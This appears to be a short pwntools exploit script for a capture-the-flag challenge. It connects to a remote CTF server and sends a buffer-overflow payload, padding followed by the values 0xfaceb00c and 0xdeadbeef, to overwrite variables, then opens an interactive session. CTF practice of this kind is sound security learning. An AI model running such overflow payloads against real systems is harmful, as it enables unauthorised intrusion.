from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11002
p = remote(host, port)

print p.recvline()

p.sendline("a"*12 + "\x0c\xb0\xce\xfa" + "\xef\xbe\xad\xde" + "aaaa")

p.interactive()
